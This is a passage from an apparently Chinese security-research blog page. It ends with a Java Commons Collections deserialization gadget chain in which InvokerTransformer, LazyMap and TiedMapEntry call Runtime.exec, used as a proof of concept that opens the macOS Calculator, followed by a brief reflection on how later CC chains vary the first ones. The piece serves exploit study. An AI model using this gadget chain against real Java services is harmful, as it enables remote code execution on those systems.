Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chains = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        HashMap hashmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map maphash = (Map)hashmap;</span><br><span class="line">        String lazy = <span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>;</span><br><span class="line">        Class lazyclass = Class.forName(lazy);</span><br><span class="line"></span><br><span class="line">        Constructor lazycon  =lazyclass.getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        lazycon.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object lazymap = lazycon.newInstance(maphash,chains);</span><br><span class="line"></span><br><span class="line">        Map laz = (Map)lazymap;</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tied = <span class="keyword">new</span> TiedMapEntry(laz,<span class="string">&quot;s1mple&quot;</span>);</span><br><span class="line">        Hashtable hash = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hash.put(tied,<span class="string">&quot;s1mple&quot;</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;s1mple.exp&quot;</span>));</span><br><span class="line">        out.writeObject(hash);</span><br><span class="line">        ObjectInputStream test = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;s1mple.exp&quot;</span>));</span><br><span class="line">        test.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>感悟；其实某种程度上感觉CC链还是有很多雷同的地方，很多条其他的CC链，基本在前两个CC链研究好了之后都是可以秒出，因为其本质上只是换了去触发相应函数的方法，前两条还挺好，后面的CC链都挺换汤不换药的；至于挖掘新的链条，其实也不是太难，只是看是继续换汤不换药还是去找新的后半部分链条的新触发方式了；</p>

            <div class="clearfix"></div>
            <hr class="nogutter">
        </div>
        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
    
    <a class="pull-left" href="/2021/05/20/FastJson%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB-%E5%8E%86%E4%BB%A3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%89%96%E6%9E%90/" style="float: left;">
        ← FastJson源码解读+历代反序列化剖析
    </a>
    
    
    <a class="pull-right" href="/2021/03/27/java-HashMap%E7%90%86%E8%A7%A3/">
        java HashMap理解 →
    </a>
    
</nav>

        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
  /**
   * 搜狐畅言
   */

  /*
  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');

  window.onload = function () {
    (function () {
      var appid = 'cytXXXX';
      var conf = 'prod_xxxxxxxxxxxxxxxxx';
      var width = window.innerWidth || document.documentElement.clientWidth;
      var loadJs = function (d, a, id) {
        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
        var b = document.createElement("script");
        b.setAttribute("type", "text/javascript");
        b.setAttribute("charset", "UTF-8");
        b.setAttribute("src", d);
        if (id) {
          b.setAttribute("id", id);
        }
        if (typeof a === "function") {
          if (window.attachEvent) {
            b.onreadystatechange = function () {
              var e = b.readyState;
              if (e === "loaded" || e === "complete") {
                b.onreadystatechange = null;
                a()
              }
            }
          } else {
            b.onload = a
          }
        }
        c.appendChild(b)
      };

      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
        window.changyan.api.config({
          appid: appid,
          conf: conf
        })
      });
    })();
  }
  */

</script>
</div>
    </div>
</section>


      
<!-- ============================ Footer =========================== -->

<footer>
    <div class="container">
            <div class="copy">
                <p>
                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By s1mple. All Rights Reserved.
                </p>
                <p>Theme By <a target="_blank" rel="noopener" href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
            </div>
            <div class="social">
                <ul>
                    
                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
                    
                </ul>
            </div>
            <div class="clearfix"> </div>
        </div>
</footer>

<!-- ============================ END Footer =========================== -->
      <!-- Load our scripts -->
<!-- Resizable 'on-demand' full-height hero -->
<script type="text/javascript">
    var resizeHero = function () {
        var hero = $(".cover,.heightblock"),
            window1 = $(window);
        hero.css({
            "height": window1.height()
        });
    };

    resizeHero();

    $(window).resize(function () {
        resizeHero();
    });
</script>
<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
<script src="/js/scripts.js"></script><!-- Theme scripts -->


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$('#intro').find('img').each(function(){
  var alt = this.alt;

  if (alt){
    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
  }

  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
});
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



      
</body>
</html>
